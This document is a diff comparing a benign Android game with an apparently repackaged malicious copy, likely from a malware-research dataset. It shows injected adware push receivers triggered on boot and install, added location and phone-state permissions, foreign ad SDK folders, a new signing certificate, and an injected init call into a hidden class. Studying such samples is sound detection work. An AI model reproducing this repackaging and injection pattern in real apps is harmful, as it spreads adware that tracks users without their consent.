@@ -1,0 +1,465 @@
+diff -r result/APP_83/App_B_83/AndroidManifest.xml result/APP_83/App_M_83/AndroidManifest.xml
+2c2
+<     <uses-feature android:glEsVersion="0x00020000" android:required="false"/>
+---
+>     <uses-feature android:glEsVersion="131072" android:required="false"/>
+10a11,39
+>         <activity android:excludeFromRecents="true" android:launchMode="singleInstance" android:name="com.kuguo.push.MainActivity"/>
+>         <service android:name="com.kuguo.push.MainService"/>
+>         <receiver android:name="com.kuguo.push.MainReceiver">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>         </receiver>
+>         <activity android:configChanges="keyboardHidden|orientation" android:name="net.cazixigang.iad.AdPushActivity"/>
+>         <receiver android:name="net.cazixigang.iad.AdPushReceiver">
+>             <intent-filter>
+>                 <action android:name="android.intent.action.PACKAGE_ADDED"/>
+>                 <data android:scheme="package"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+>             </intent-filter>
+>             <intent-filter>
+>                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
+>             </intent-filter>
+>         </receiver>
+>         <service android:name="net.cazixigang.iad.AdPushService"/>
+>         <meta-data android:name="INIT_KEY" android:value="9a6c836079fa4862a37fc3872acf20e9,10047,ydsc7izxncda31ku,20121122,1"/>
+>         <meta-data android:name="UMENG_APPKEY" android:value="4ff5ae0a5270155bf800001a"/>
+>         <meta-data android:name="UMENG_CHANNEL" android:value="gfan"/>
+>         <meta-data android:name="tapjoy.store_name" android:value="gfan"/>
+11a41,51
+>     <uses-permission android:name="android.permission.INTERNET"/>
+>     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+>     <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+>     <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+>     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+>     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+>     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+>     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+>     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+>     <uses-permission android:name="android.permission.WAKE_LOCK"/>
+>     <uses-permission android:name="android.permission.GET_TASKS"/>
+diff -r result/APP_83/App_B_83/Animations/CAnimHeader.java result/APP_83/App_M_83/Animations/CAnimHeader.java
+16,22c16,18
+<     short[] arrayOfShort2 = { 2, 0, 0, 0 };
+<     short[] arrayOfShort3 = { 1, 0, 0, 0 };
+<     short[] arrayOfShort4 = { 0, 0, 0, 0 };
+<     short[] arrayOfShort5 = { 0, 1, 2, 0 };
+<     short[] arrayOfShort6 = { 0, 1, 2, 0 };
+<     short[] arrayOfShort7 = { 0, 0, 0, 0 };
+<     tableApprox = new short[][] { arrayOfShort1, arrayOfShort2, arrayOfShort3, { 0, 1, 2, 0 }, arrayOfShort4, { 0, 1, 2, 0 }, { 0, 1, 2, 0 }, { 1, 2, 0, 0 }, arrayOfShort5, { 1, 2, 0, 0 }, { 0, 1, 2, 0 }, arrayOfShort6, { 0, 0, 0, 0 }, arrayOfShort7, { 0, 0, 0, 0 }, { 0, 0, 0, 0 } };
+---
+>     short[] arrayOfShort2 = { 1, 2, 0, 0 };
+>     short[] arrayOfShort3 = { 0, 1, 2, 0 };
+>     tableApprox = new short[][] { arrayOfShort1, { 2, 0, 0, 0 }, { 1, 0, 0, 0 }, { 0, 1, 2, 0 }, { 0, 0, 0, 0 }, { 0, 1, 2, 0 }, { 0, 1, 2, 0 }, { 1, 2, 0, 0 }, { 0, 1, 2, 0 }, arrayOfShort2, { 0, 1, 2, 0 }, arrayOfShort3, { 0, 0, 0, 0 }, { 0, 0, 0, 0 }, { 0, 0, 0, 0 }, { 0, 0, 0, 0 } };
+diff -r result/APP_83/App_B_83/apktool.yml result/APP_83/App_M_83/apktool.yml
+2c2
+< apkFileName: Bapp83-C06D8F084C95407F8637B1126AFEEA7B55C4D652CE6915E2251942F1B518142C.apk
+---
+> apkFileName: Mapp83-C1CB5E292BEB223CAF63226622CDD044BDF586C4C730EFFC31FB2B7B2F53C9D1.apk
+5d4
+< - resources.arsc
+Somente em result/APP_83/App_M_83/: assets
+Somente em result/APP_83/App_M_83/com: geseng
+Somente em result/APP_83/App_M_83/com: kuguo
+Somente em result/APP_83/App_M_83/com: tapjoy
+Somente em result/APP_83/App_M_83/com: umeng
+diff -r result/APP_83/App_B_83/Movements/CMoveBall.java result/APP_83/App_M_83/Movements/CMoveBall.java
+28,39c28,29
+<     short[] arrayOfShort1 = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 };
+<     short[] arrayOfShort2 = { 30, 31, 0, 1, 4, 3, 2, 1, 0, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 24, 25, 26, 27, 27, 28, 28, 28, 28, 29, 29 };
+<     short[] arrayOfShort3 = { 0, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 20, 21, 22, 22, 23, 24, 24, 24, 24, 25, 26, 27, 28, 29, 30 };
+<     short[] arrayOfShort4 = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 };
+<     short[] arrayOfShort5 = { 16, 15, 14, 13, 12, 11, 10, 9, 8, 12, 13, 14, 15, 15, 16, 16, 16, 16, 17, 17, 18, 19, 20, 21, 24, 23, 22, 21, 20, 19, 18, 17 };
+<     short[] arrayOfShort6 = { 16, 17, 18, 19, 20, 21, 22, 23, 24, 23, 22, 21, 20, 19, 18, 17, 16, 17, 18, 19, 20, 21, 22, 23, 24, 23, 22, 21, 20, 19, 18, 17 };
+<     short[] arrayOfShort7 = { 3, 3, 4, 4, 4, 4, 5, 5, 6, 7, 8, 9, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 31, 30, 29, 28, 0, 1, 2 };
+<     short[] arrayOfShort8 = { 0, 0, 1, 1, 2, 3, 4, 5, 8, 7, 6, 5, 4, 3, 2, 1, 0, 31, 30, 29, 28, 27, 26, 25, 24, 28, 29, 30, 31, 31, 0, 0 };
+<     short[] arrayOfShort9 = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 };
+<     short[] arrayOfShort10 = { 0, 31, 30, 29, 28, 27, 26, 25, 24, 25, 26, 27, 28, 29, 30, 31, 0, 31, 30, 29, 28, 27, 25, 25, 24, 25, 26, 27, 28, 29, 30, 31 };
+<     short[] arrayOfShort11 = { 16, 15, 14, 13, 12, 11, 10, 9, 8, 9, 10, 11, 12, 13, 14, 15, 16, 15, 14, 13, 12, 11, 10, 9, 8, 9, 10, 11, 12, 13, 14, 15 };
+<     rebond_List = new short[][] { arrayOfShort1, arrayOfShort2, { 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 16, 17, 18, 19, 19, 20, 20, 20, 20, 21, 21, 22, 23, 24, 25, 28, 27, 26, 25 }, arrayOfShort3, { 8, 7, 6, 5, 4, 8, 9, 10, 11, 11, 12, 12, 12, 12, 13, 13, 14, 15, 16, 17, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9 }, arrayOfShort4, arrayOfShort5, arrayOfShort6, arrayOfShort7, arrayOfShort8, arrayOfShort9, arrayOfShort10, { 0, 4, 5, 6, 7, 7, 8, 8, 8, 8, 9, 9, 10, 11, 12, 13, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 7, 6, 5, 4, 3, 2, 1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 7, 6, 5, 4, 3, 2, 1 }, arrayOfShort11, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 } };
+---
+>     short[] arrayOfShort = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 };
+>     rebond_List = new short[][] { { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }, { 30, 31, 0, 1, 4, 3, 2, 1, 0, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 24, 25, 26, 27, 27, 28, 28, 28, 28, 29, 29 }, { 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 16, 17, 18, 19, 19, 20, 20, 20, 20, 21, 21, 22, 23, 24, 25, 28, 27, 26, 25 }, { 0, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 20, 21, 22, 22, 23, 24, 24, 24, 24, 25, 26, 27, 28, 29, 30 }, { 8, 7, 6, 5, 4, 8, 9, 10, 11, 11, 12, 12, 12, 12, 13, 13, 14, 15, 16, 17, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9 }, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }, { 16, 15, 14, 13, 12, 11, 10, 9, 8, 12, 13, 14, 15, 15, 16, 16, 16, 16, 17, 17, 18, 19, 20, 21, 24, 23, 22, 21, 20, 19, 18, 17 }, { 16, 17, 18, 19, 20, 21, 22, 23, 24, 23, 22, 21, 20, 19, 18, 17, 16, 17, 18, 19, 20, 21, 22, 23, 24, 23, 22, 21, 20, 19, 18, 17 }, { 3, 3, 4, 4, 4, 4, 5, 5, 6, 7, 8, 9, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 31, 30, 29, 28, 0, 1, 2 }, { 0, 0, 1, 1, 2, 3, 4, 5, 8, 7, 6, 5, 4, 3, 2, 1, 0, 31, 30, 29, 28, 27, 26, 25, 24, 28, 29, 30, 31, 31, 0, 0 }, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }, { 0, 31, 30, 29, 28, 27, 26, 25, 24, 25, 26, 27, 28, 29, 30, 31, 0, 31, 30, 29, 28, 27, 25, 25, 24, 25, 26, 27, 28, 29, 30, 31 }, { 0, 4, 5, 6, 7, 7, 8, 8, 8, 8, 9, 9, 10, 11, 12, 13, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 7, 6, 5, 4, 3, 2, 1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 7, 6, 5, 4, 3, 2, 1 }, { 16, 15, 14, 13, 12, 11, 10, 9, 8, 9, 10, 11, 12, 13, 14, 15, 16, 15, 14, 13, 12, 11, 10, 9, 8, 9, 10, 11, 12, 13, 14, 15 }, arrayOfShort };
+Somente em result/APP_83/App_M_83/: net
+Os arquivos binários result/APP_83/App_B_83/original/AndroidManifest.xml e result/APP_83/App_M_83/original/AndroidManifest.xml são diferentes
+Somente em result/APP_83/App_B_83/original/META-INF: CERT.RSA
+Somente em result/APP_83/App_B_83/original/META-INF: CERT.SF
+diff -r result/APP_83/App_B_83/original/META-INF/MANIFEST.MF result/APP_83/App_M_83/original/META-INF/MANIFEST.MF
+2c2
+< Created-By: 1.0 (Android)
+---
+> Created-By: 1.6.0 (Sun Microsystems Inc.)
+13,15d12
+< Name: res/raw/s0053.mp3
+< SHA1-Digest: 0XMDXWRE9FHqgqQKvn51ZoEQhn8=
+< 
+25,29c22,23
+< Name: res/raw/s0026.wav
+< SHA1-Digest: ptFBTGz3rACuKLR5xQvtTXt+1Ak=
+< 
+< Name: res/raw/s0027.wav
+< SHA1-Digest: NNnKmsAaX+nASiQ8Dv5GE2GbjFw=
+---
+> Name: res/raw/s0053.mp3
+> SHA1-Digest: 0XMDXWRE9FHqgqQKvn51ZoEQhn8=
+34,39d27
+< Name: res/drawable-mdpi/launcher.png
+< SHA1-Digest: GV6mZqUFELBsl7gD4bgkLv/1UYg=
+< 
+< Name: res/drawable/fire2u.png
+< SHA1-Digest: 1i5U8ZoQfeeKw4rYqmVPRf/DXCY=
+< 
+43,48d30
+< Name: res/raw/s0011.wav
+< SHA1-Digest: zqO050Ws5v0dCPP5BLFP5E+9cpc=
+< 
+< Name: res/raw/s0000.wav
+< SHA1-Digest: zlhFrnj8u/ZqmNPf5EBQpb6q6cU=
+< 
+52,53c34,35
+< Name: res/raw/s0036.wav
+< SHA1-Digest: v6duVAHB94lu6NpM+s6C0++Iw6Y=
+---
+> Name: res/raw/s0011.wav
+> SHA1-Digest: zqO050Ws5v0dCPP5BLFP5E+9cpc=
+55,56c37,38
+< Name: res/raw/s0020.wav
+< SHA1-Digest: odhda4Tk5kl4KEm/63D5c8I/V0M=
+---
+> Name: res/drawable/joyfront.png
+> SHA1-Digest: n1eG9QGD8Ev8iOG+bZR8+EVrRFo=
+61,62c43,44
+< Name: res/drawable/joyfront.png
+< SHA1-Digest: n1eG9QGD8Ev8iOG+bZR8+EVrRFo=
+---
+> Name: res/raw/s0020.wav
+> SHA1-Digest: odhda4Tk5kl4KEm/63D5c8I/V0M=
+73,75d54
+< Name: res/raw/s0056.mp3
+< SHA1-Digest: T0emOO79BFH1LzDwxXm/Z0W7VzI=
+< 
+79,84d57
+< Name: lib/armeabi-v7a/libES2Renderer.so
+< SHA1-Digest: VhluXfisit8HsVQwZupM7HmQalQ=
+< 
+< Name: res/raw/s0038.wav
+< SHA1-Digest: vKYxZriW9IUJZvcuGO5Azrvve3g=
+< 
+88,92c61,62
+< Name: res/raw/s0034.wav
+< SHA1-Digest: xjln4zqqUzflEWDq3Fn5O6LJvio=
+< 
+< Name: res/drawable/fire2d.png
+< SHA1-Digest: dQlqnuNguGfKOHhAeJ0+4oHcQs0=
+---
+> Name: res/raw/s0038.wav
+> SHA1-Digest: vKYxZriW9IUJZvcuGO5Azrvve3g=
+97,98c67,68
+< Name: res/drawable/fire1u.png
+< SHA1-Digest: liaMKtC4NwattJ13AIjmmTHEJvU=
+---
+> Name: assets/kuguo_res/confirm_btn_pressed.png
+> SHA1-Digest: oY/MZIRapnKGabQhUv9sd8CPCbQ=
+106,120d75
+< Name: res/raw/default_ellipse_frag.fsh
+< SHA1-Digest: Gs0auawH8AijLQuwTYTnZlmaD0g=
+< 
+< Name: res/drawable-hdpi/launcher.png
+< SHA1-Digest: jqj1E9Mf3sgx/cHk1RASQUuP7dc=
+< 
+< Name: lib/armeabi/libES1Renderer.so
+< SHA1-Digest: WqqbtCJsPXqCXtmOU02oGpfiNWM=
+< 
+< Name: res/raw/s0032.wav
+< SHA1-Digest: TrSsyaD3NADs8zUdU1nUyRwmyFA=
+< 
+< Name: res/raw/basic_vert.vsh
+< SHA1-Digest: cZLxkHbH9K2FZBnyFpzHoNdXW4c=
+< 
+128c83
+< SHA1-Digest: EAG9ngxw6FFgOSYldfCUG65BmYM=
+---
+> SHA1-Digest: 2H8/JGT0JGz2MrbpNHhwh37ESv4=
+133,138d87
+< Name: res/raw/s0074.wav
+< SHA1-Digest: aS01st4dKE3pf70Bpe+TtBIJQTM=
+< 
+< Name: res/raw/s0009.wav
+< SHA1-Digest: R74AOEK915ohAnchUYMEoIf5B64=
+< 
+142,146c91,92
+< Name: res/raw/s0039.wav
+< SHA1-Digest: AWX+lj40FqDGOK1HzVTqLKrzLis=
+< 
+< Name: res/raw/s0025.wav
+< SHA1-Digest: Eeichu2mwegFcv851CW6qjNBrEM=
+---
+> Name: res/raw/s0009.wav
+> SHA1-Digest: R74AOEK915ohAnchUYMEoIf5B64=
+154,156d99
+< Name: res/raw/s0050.wav
+< SHA1-Digest: oLpm8xz3J/RnXd8fMoMyBucfEgU=
+< 
+162a106,240
+> Name: resources.arsc
+> SHA1-Digest: pjLx0/hhd/88igFndZVcElWjfeE=
+> 
+> Name: res/raw/s0051.wav
+> SHA1-Digest: TpwfRi7an2SvjWR5nZjZcCPZs18=
+> 
+> Name: AndroidManifest.xml
+> SHA1-Digest: k/fLenqH4JQJxOWub/u1gHlL18E=
+> 
+> Name: res/raw/s0065.wav
+> SHA1-Digest: 1qxIMuH6zNSTJWcmZe8D2cePg3s=
+> 
+> Name: assets/kuguo_res/push_cancel_btn_pressed.png
+> SHA1-Digest: CbQHVmHL3PxfmzP+MMFrIUI9vT4=
+> 
+> Name: res/raw/default_frag.fsh
+> SHA1-Digest: 3v6xZeFE/bZyrifzAX60Ep9bEaE=
+> 
+> Name: res/drawable-xhdpi/launcher.png
+> SHA1-Digest: NHPryt8Dmasfls95GpgT6ITKkq4=
+> 
+> Name: res/raw/gradient_ellipse_frag.fsh
+> SHA1-Digest: UubqyyemIoGPmBbCleZd/6Qt4eQ=
+> 
+> Name: assets/kuguo_res/download_btn2.png
+> SHA1-Digest: MBPHHzDxFqdfXsBLtm7DSajWU1w=
+> 
+> Name: classes.dex
+> SHA1-Digest: YfuHJlTKG66jvmQcN6rRDL3P4cw=
+> 
+> Name: assets/kuguo_res/spot_default.png
+> SHA1-Digest: E4fi2Oiw3vnkWEnhps2hIa4+gp8=
+> 
+> Name: res/raw/s0029.wav
+> SHA1-Digest: W7uiPUp7iGtdMam+7HqtedvXZJk=
+> 
+> Name: assets/kuguo_res/push_cancel_btn.png
+> SHA1-Digest: xFZxC1NS0KoZjvtGL4hUEAZ1oMM=
+> 
+> Name: res/raw/s0002.mp3
+> SHA1-Digest: VCirUBHvnFf1pEDQ2q6IABiRCiw=
+> 
+> Name: res/raw/s0076.wav
+> SHA1-Digest: iGYbvWodni1cC+aT17Lwoq6F8Kk=
+> 
+> Name: assets/kuguo_res/icon.png
+> SHA1-Digest: xojjGOMaFE9l5JGijGWsO/RgymY=
+> 
+> Name: res/raw/s0028.wav
+> SHA1-Digest: NRo1KoV86/tIhYF0WPeWVLEUvio=
+> 
+> Name: res/raw/s0070.wav
+> SHA1-Digest: +V4MeXPzOqRiokBIQN2hu218HaA=
+> 
+> Name: assets/kuguo_res/fold_arrow.png
+> SHA1-Digest: aPV5nrym+b3yv4JxlPO9BHg6+k0=
+> 
+> Name: assets/kuguo_res/download_btn2_pressed.png
+> SHA1-Digest: AtUClOw6HmlJO+VrNZ7YD/BWibQ=
+> 
+> Name: res/raw/s0052.wav
+> SHA1-Digest: yjBUMBiswV1775ITgs5DdD1MLAY=
+> 
+> Name: lib/x86/libES1Renderer.so
+> SHA1-Digest: mGHyTHf4mgHnLyu2McP6cwW645Q=
+> 
+> Name: res/raw/s0045.mp3
+> SHA1-Digest: Z0ZFy95Kwd7aEW/jMzSTAG/4lyQ=
+> 
+> Name: res/raw/s0026.wav
+> SHA1-Digest: ptFBTGz3rACuKLR5xQvtTXt+1Ak=
+> 
+> Name: res/raw/s0027.wav
+> SHA1-Digest: NNnKmsAaX+nASiQ8Dv5GE2GbjFw=
+> 
+> Name: res/drawable-mdpi/launcher.png
+> SHA1-Digest: GV6mZqUFELBsl7gD4bgkLv/1UYg=
+> 
+> Name: assets/kuguo_res/spot_light.png
+> SHA1-Digest: HDYglOL1e3Rk0VmuY8QCQ0oNoTs=
+> 
+> Name: res/drawable/fire2u.png
+> SHA1-Digest: 1i5U8ZoQfeeKw4rYqmVPRf/DXCY=
+> 
+> Name: res/raw/s0000.wav
+> SHA1-Digest: zlhFrnj8u/ZqmNPf5EBQpb6q6cU=
+> 
+> Name: res/raw/s0036.wav
+> SHA1-Digest: v6duVAHB94lu6NpM+s6C0++Iw6Y=
+> 
+> Name: res/raw/s0056.mp3
+> SHA1-Digest: T0emOO79BFH1LzDwxXm/Z0W7VzI=
+> 
+> Name: lib/armeabi-v7a/libES2Renderer.so
+> SHA1-Digest: VhluXfisit8HsVQwZupM7HmQalQ=
+> 
+> Name: res/raw/s0034.wav
+> SHA1-Digest: xjln4zqqUzflEWDq3Fn5O6LJvio=
+> 
+> Name: res/drawable/fire2d.png
+> SHA1-Digest: dQlqnuNguGfKOHhAeJ0+4oHcQs0=
+> 
+> Name: res/drawable/fire1u.png
+> SHA1-Digest: liaMKtC4NwattJ13AIjmmTHEJvU=
+> 
+> Name: res/raw/default_ellipse_frag.fsh
+> SHA1-Digest: Gs0auawH8AijLQuwTYTnZlmaD0g=
+> 
+> Name: res/drawable-hdpi/launcher.png
+> SHA1-Digest: jqj1E9Mf3sgx/cHk1RASQUuP7dc=
+> 
+> Name: lib/armeabi/libES1Renderer.so
+> SHA1-Digest: WqqbtCJsPXqCXtmOU02oGpfiNWM=
+> 
+> Name: res/raw/s0032.wav
+> SHA1-Digest: TrSsyaD3NADs8zUdU1nUyRwmyFA=
+> 
+> Name: res/raw/basic_vert.vsh
+> SHA1-Digest: cZLxkHbH9K2FZBnyFpzHoNdXW4c=
+> 
+> Name: res/raw/s0074.wav
+> SHA1-Digest: aS01st4dKE3pf70Bpe+TtBIJQTM=
+> 
+> Name: assets/kuguo_res/snapshot_empty.png
+> SHA1-Digest: DSmTSCP3TKTP8Cw8/9byyIcYP28=
+> 
+> Name: res/raw/s0025.wav
+> SHA1-Digest: Eeichu2mwegFcv851CW6qjNBrEM=
+> 
+> Name: res/raw/s0039.wav
+> SHA1-Digest: AWX+lj40FqDGOK1HzVTqLKrzLis=
+> 
+> Name: res/raw/s0050.wav
+> SHA1-Digest: oLpm8xz3J/RnXd8fMoMyBucfEgU=
+> 
+169,170c247,248
+< Name: resources.arsc
+< SHA1-Digest: RycpLPFJ/8Zs+alTk7E6naBJq5o=
+---
+> Name: res/raw/s0008.wav
+> SHA1-Digest: GqxZS1crbzOCeyM9Zp5wLbmCkkE=
+175,179c253,254
+< Name: res/raw/s0051.wav
+< SHA1-Digest: TpwfRi7an2SvjWR5nZjZcCPZs18=
+< 
+< Name: res/raw/s0008.wav
+< SHA1-Digest: GqxZS1crbzOCeyM9Zp5wLbmCkkE=
+---
+> Name: res/raw/basic_frag.fsh
+> SHA1-Digest: G+tm01p9Z1Neo5rzLBOaSp/Px+A=
+184,186d258
+< Name: res/raw/basic_frag.fsh
+< SHA1-Digest: G+tm01p9Z1Neo5rzLBOaSp/Px+A=
+< 
+193,198d264
+< Name: AndroidManifest.xml
+< SHA1-Digest: xOzcJxYWCu3k5YXWwexLX8c+YKw=
+< 
+< Name: res/raw/s0065.wav
+< SHA1-Digest: 1qxIMuH6zNSTJWcmZe8D2cePg3s=
+< 
+217,225d282
+< Name: res/raw/default_frag.fsh
+< SHA1-Digest: 3v6xZeFE/bZyrifzAX60Ep9bEaE=
+< 
+< Name: res/drawable-xhdpi/launcher.png
+< SHA1-Digest: NHPryt8Dmasfls95GpgT6ITKkq4=
+< 
+< Name: res/raw/gradient_ellipse_frag.fsh
+< SHA1-Digest: UubqyyemIoGPmBbCleZd/6Qt4eQ=
+< 
+228a286,288
+> Name: assets/kuguo_res/confirm_btn.png
+> SHA1-Digest: YuSe5o0DswmLLQmJLeyoTs7alDY=
+> 
+235,240d294
+< Name: res/raw/s0029.wav
+< SHA1-Digest: W7uiPUp7iGtdMam+7HqtedvXZJk=
+< 
+< Name: classes.dex
+< SHA1-Digest: P2KxISuRgbLc5kNyNaOgK/Pxr14=
+< 
+247,252d300
+< Name: res/raw/s0002.mp3
+< SHA1-Digest: VCirUBHvnFf1pEDQ2q6IABiRCiw=
+< 
+< Name: res/raw/s0076.wav
+< SHA1-Digest: iGYbvWodni1cC+aT17Lwoq6F8Kk=
+< 
+259,266c307,308
+< Name: res/raw/s0028.wav
+< SHA1-Digest: NRo1KoV86/tIhYF0WPeWVLEUvio=
+< 
+< Name: res/raw/s0070.wav
+< SHA1-Digest: +V4MeXPzOqRiokBIQN2hu218HaA=
+< 
+< Name: res/raw/s0052.wav
+< SHA1-Digest: yjBUMBiswV1775ITgs5DdD1MLAY=
+---
+> Name: res/raw/default_vert.vsh
+> SHA1-Digest: IId1OjsdVSO6+ODwVyt0IDNmTos=
+268,269c310,311
+< Name: res/raw/s0057.mp3
+< SHA1-Digest: YLEAXoEMVeFWJQFkws4Dq7b4rQk=
+---
+> Name: res/raw/s0015.wav
+> SHA1-Digest: bkprsJVgCjzEfw/pH2w5URh3yB4=
+274,278c316,317
+< Name: res/raw/s0015.wav
+< SHA1-Digest: bkprsJVgCjzEfw/pH2w5URh3yB4=
+< 
+< Name: res/raw/default_vert.vsh
+< SHA1-Digest: IId1OjsdVSO6+ODwVyt0IDNmTos=
+---
+> Name: res/raw/s0057.mp3
+> SHA1-Digest: YLEAXoEMVeFWJQFkws4Dq7b4rQk=
+283,287c322,323
+< Name: lib/x86/libES1Renderer.so
+< SHA1-Digest: mGHyTHf4mgHnLyu2McP6cwW645Q=
+< 
+< Name: res/raw/s0045.mp3
+< SHA1-Digest: Z0ZFy95Kwd7aEW/jMzSTAG/4lyQ=
+---
+> Name: assets/kuguo_res/360.png
+> SHA1-Digest: l+Fj8rnP63ymLQTbbTeI2n7q89k=
+Somente em result/APP_83/App_M_83/original/META-INF: RANGFEI.RSA
+Somente em result/APP_83/App_M_83/original/META-INF: RANGFEI.SF
+diff -r result/APP_83/App_B_83/RunLoop/CRun.java result/APP_83/App_M_83/RunLoop/CRun.java
+119c119
+<   public static final byte[][] plMasks;
+---
+>   public static final byte[][] plMasks = { { 0, 0, 0, 0 }, { -1, 0, 0, 0 }, { -1, -1, 0, 0 }, { -1, -1, -1, 0 }, { -1, -1, -1, -1 } };
+235,242d234
+<   
+<   static
+<   {
+<     byte[] arrayOfByte1 = { 0, 0, 0, 0 };
+<     byte[] arrayOfByte2 = { -1, -1, -1, 0 };
+<     byte[] arrayOfByte3 = { -1, -1, -1, -1 };
+<     plMasks = new byte[][] { arrayOfByte1, { -1, 0, 0, 0 }, { -1, -1, 0, 0 }, arrayOfByte2, arrayOfByte3 };
+<   }
+diff -r result/APP_83/App_B_83/Runtime/MMFRuntime.java result/APP_83/App_M_83/Runtime/MMFRuntime.java
+25a26
+> import com.geseng.Dienghla;
+765a767
+>     Dienghla.init(this);
+Somente em result/APP_83/App_M_83/smali/com: geseng
+Somente em result/APP_83/App_M_83/smali/com: kuguo
+Somente em result/APP_83/App_M_83/smali/com: tapjoy
+Somente em result/APP_83/App_M_83/smali/com: umeng
+Somente em result/APP_83/App_M_83/smali: net
+diff -r result/APP_83/App_B_83/smali/Runtime/MMFRuntime.smali result/APP_83/App_M_83/smali/Runtime/MMFRuntime.smali
+2075a2076,2077
+>     invoke-static {p0}, Lcom/geseng/Dienghla;->init(Landroid/content/Context;)V
+> 
